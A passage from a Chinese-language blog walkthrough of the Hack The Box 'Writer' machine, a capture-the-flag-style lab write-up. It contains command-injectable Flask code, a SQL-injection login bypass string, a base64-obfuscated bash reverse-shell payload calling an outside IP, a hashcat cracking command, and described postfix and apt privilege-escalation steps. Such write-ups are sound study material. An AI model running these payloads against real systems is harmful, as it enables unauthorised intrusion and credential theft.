class="hljs-string">&#x27;image_url&#x27;</span>):<br>            image_url = request.form.get(<span class="hljs-string">&#x27;image_url&#x27;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;.jpg&quot;</span> <span class="hljs-keyword">in</span> image_url:<br>                <span class="hljs-keyword">try</span>:<br>                    local_filename, headers = urllib.request.urlretrieve(image_url)<br>                    os.system(<span class="hljs-string">&quot;mv &#123;&#125; &#123;&#125;.jpg&quot;</span>.<span class="hljs-built_in">format</span>(local_filename, local_filename))<br>                    image = <span class="hljs-string">&quot;&#123;&#125;.jpg&quot;</span>.<span class="hljs-built_in">format</span>(local_filename)<br>                    <span class="hljs-keyword">try</span>:<br>                        im = Image.<span class="hljs-built_in">open</span>(image) <br>                        im.verify()<br>                        im.close()<br>                        image = image.replace(<span class="hljs-string">&#x27;/tmp/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>                        os.system(<span class="hljs-string">&quot;mv /tmp/&#123;&#125; /var/www/writer.htb/writer/static/img/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(image, image))<br></code></pre></div></td></tr></table></figure><h2 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h2><p>可以在image_url后面拼接命令反弹shell。要进入这个接口，需要我们先进入系统后台，由于存在SQL注入漏洞，可以直接使用万能密码登录后台。<br>admin’ or ‘1’=’1</p><p><img src="/images/pasted-8.png" alt="upload successful"></p><p>进入后台后，在添加文章页面，注入命令反弹shell。注意这个URLlib这里想进行命令拼接注入，URL路径只能是服务端本地的路径，否则无法执行命令。</p><p>通过本地文件上传功能上传一个反弹shell的文件名</p><p><img src="/images/pasted-11.png" alt="upload successful"></p><p><img src="/images/pasted-12.png" alt="upload successful"></p><p>通过URL参数读取拼接命令注入的文件名，拿到shell。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">file:///var/www/writer.htb/writer/static/img/01.jpg;`<span class="hljs-built_in">echo</span> YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNi81NTU1IDwmMSc= | base64 -d | bash`<br></code></pre></div></td></tr></table></figure><p><img src="/images/pasted-13.png" alt="upload successful"></p><p><img src="/images/pasted-14.png" alt="upload successful"></p><p>查看mysql数据库配置文件</p><p><img src="/images/pasted-17.png" alt="upload successful"></p><p>将mysql的端口转发出来</p><p><img src="/images/pasted-18.png" alt="upload successful"></p><p>连接数据库查看数据</p><p><img src="/images/pasted-20.png" alt="upload successful"></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">hashcat -a 0 -m 10000 pass.txt --wordlist /usr/share/wordlists/rockyou.txt<br></code></pre></div></td></tr></table></figure><p>破解密码</p><p><img src="/images/pasted-21.png" alt="upload successful"></p><p>拿到密码之后，ssh到kyle用户</p><p><img src="/images/pasted-23.png" alt="upload successful"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>查看本地监听端口</p><p><img src="/images/pasted-25.png" alt="upload successful"></p><p>端口转发</p><p><img src="/images/pasted-26.png" alt="upload successful"></p><p>nmap扫描判断服务和版本</p><p><img src="/images/pasted-27.png" alt="upload successful"></p><p>查看kyle用户信息</p><p><img src="/images/pasted-28.png" alt="upload successful"></p><p>查看filter组拥有的文件权限</p><p><img src="/images/pasted-29.png" alt="upload successful"></p><p>可通过向postfix邮箱的配置文件当中写命令来完成反弹shell，反弹shell的用户是收到邮件的用户。</p><p>写shell命令</p><p><img src="/images/pasted-31.png" alt="upload successful"></p><p>发送邮件</p><p><img src="/images/pasted-32.png" alt="upload successful"></p><p>获得shell</p><p><img src="/images/pasted-33.png" alt="upload successful"></p><p>读取.ssh私钥信息</p><p><img src="/images/pasted-34.png" alt="upload successful"></p><p>通过ssh私钥连接</p><p><img src="/images/pasted-35.png" alt="upload successful"></p><p>查看本地进程，有apt服务，且以root运行</p><p><img src="/images/pasted-36.png" alt="upload successful"></p><p>用户john权限信息</p><p><img src="/images/pasted-37.png" alt="upload successful"></p><p>查看apt配置文件目录的权限信息</p><p><img src="/images/pasted-38.png" alt="upload successful"></p><p>通过修改apt的配置文件，反弹shell提权到root</p><p><img src="/images/pasted-40.png" alt="upload successful"></p><p>反弹shell</p><p><img src="/images/pasted-41.png" alt="upload successful"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://rustlang.rs/post/htb-writer/">https://rustlang.rs/post/htb-writer/</a></li><li><a href="https://book.hacktricks.xyz/pentesting/pentesting-smtp">https://book.hacktricks.xyz/pentesting/pentesting-smtp</a></li><li><a href="https://viperone.gitbook.io/pentest-everything/all-writeups/pg-practice/linux/postfish">https://viperone.gitbook.io/pentest-everything/all-writeups/pg-practice/linux/postfish</a></li><li><a href="https://mobt3ath.com/uplode/books/book-27297.pdf">https://mobt3ath.com/uplode/books/book-27297.pdf</a></li><li><a href="https://gtfobins.github.io/gtfobins/apt-get/">https://gtfobins.github.io/gtfobins/apt-get/</a></li><li><a href="https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/">https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/</a></li></ul><h2 id="总结学习"><a href="#总结学习" class="headerlink" title="总结学习"></a>总结学习</h2><ul><li>apache其中之一默认配置文件路径 /etc/apache2/sites-enabled/000-default.conf</li><li>sqlmap 联合注入读取文件</li><li>python package结构</li><li>python os system命令注入</li><li>mysql服务配置文件 /etc/mysql/my.cnf</li><li>john、hashcat 破解密码 rockyou字典</li><li>/etc/postfix/disclaimer 配置文件getshell</li><li>apt 配置文件getshell</li><li>用户组权限、进程、端口</li><li>信息收集、信息收集、信息收集</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>HTB</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
